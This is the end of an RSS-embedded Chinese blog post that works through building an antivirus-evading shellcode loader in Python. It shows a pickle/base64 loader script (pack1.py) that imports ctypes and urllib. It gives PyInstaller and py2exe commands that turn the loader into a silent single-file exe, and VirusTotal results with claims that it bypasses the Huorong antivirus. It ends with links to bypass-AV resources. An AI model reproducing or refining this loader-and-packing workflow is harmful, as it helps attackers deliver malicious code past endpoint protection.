&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>被pyinstaller或py2exe打包的部分 pack1.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ctypes&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">urllib.request&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">codecs&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ret_base64&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ret_base64&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>PyInstaller&lt;/li>
&lt;/ul>
&lt;p>打包的更多参数参见&lt;a href="https://pyinstaller.org/en/stable/usage.html">doc: Using PyInstaller&lt;/a>，生成exe在dist文件夹中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install pyinstaller
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pyinstaller --noconsole --onefile pack1.py -n demo1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --noconsole 无黑框&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --onefile 单一文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -i 指定favicon&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -n 生成exe名字&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>就以这样最简单的方式制作的加载器的查杀情况是&lt;a href="https://www.virustotal.com/gui/file/56420390689318d252b5aab886cb7aad52ee919e99896598306ed938dfc3cdf1">22/66&lt;/a>，可以直接过火绒&lt;/p>
&lt;ul>
&lt;li>py2exe（*亲测 生成的exe文件大小小于PyInstaller 但一定概率无法执行 ）&lt;/li>
&lt;/ul>
&lt;p>中间媒介pack2.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">distutils.core&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">setup&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">py2exe&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">setup&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">options&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;py2exe&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;optimize&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 优化级别最高，&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;bundle_files&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 将生成的调用文件打包进exe文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#39;compressed&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 压缩&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">windows&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[{&lt;/span>&lt;span style="color:#d88200">&amp;#34;script&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;pack1.py&amp;#34;&lt;/span>&lt;span style="color:#111">}],&lt;/span> &lt;span style="color:#75715e">#需要打包的程序的文件路径，windows-&amp;gt;GUI exe的脚本列表,console-&amp;gt; 控制台exe的脚本列表&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">zipfile&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e"># 不生成library.zip文件，则捆绑在可执行文件中&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>pip3 install py2exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python pack2.py py2exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查杀情况&lt;a href="https://www.virustotal.com/gui/file/87c4fc12bd71bd1fce694393a6f6cab8a1b18424ef6d2d2d6ad062a65ab83bca">14/69&lt;/a>，可过火绒&lt;/p>
&lt;hr>
&lt;p>一开始就是做靶场的时候一时兴起看看免杀，后来发现里面门道还挺多的（我是土狗），估计以后有空还会认真学&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://haiderm.com/undetectable-backdooring-pe-file/">Undetectable backdooring PE file&lt;/a> | &lt;a href="https://scareing.github.io/2019/12/27/%E6%89%8B%E5%B7%A5shellcode%E6%B3%A8%E5%85%A5/">手工shellcode注入&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/132175.html">恶意程序编写之免杀基础&lt;/a> | &lt;a href="https://shu1l.github.io/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/">免杀学习&amp;ndash;shellcode加载免杀&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://webcache.googleusercontent.com/search?q=cache:oZ7CzvkDPFsJ:https://pukrr.github.io/2020/02/25/%25E5%2587%25A0%25E7%25A7%258D%25E5%258A%25A0%25E8%25BD%25BDshellcode%25E7%259A%2584%25E6%2596%25B9%25E6%25B3%2595/+&amp;amp;cd=4&amp;amp;hl=zh-CN&amp;amp;ct=clnk">几种加载shellcode的方法&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Ne0nd0g/go-shellcode">go-shellcode&lt;/a> | &lt;a href="https://github.com/safe6Sec/GolangBypassAV">GolangBypassAV&lt;/a> | &lt;a href="https://github.com/pureqh/bypassAV">bypassAV&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.nday.top/2020/12/07/Python%20Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%BB%95%E8%BF%87AV/">Python Shellcode加载器绕过AV&lt;/a>&lt;/p>
&lt;/details></description></item></channel></rss>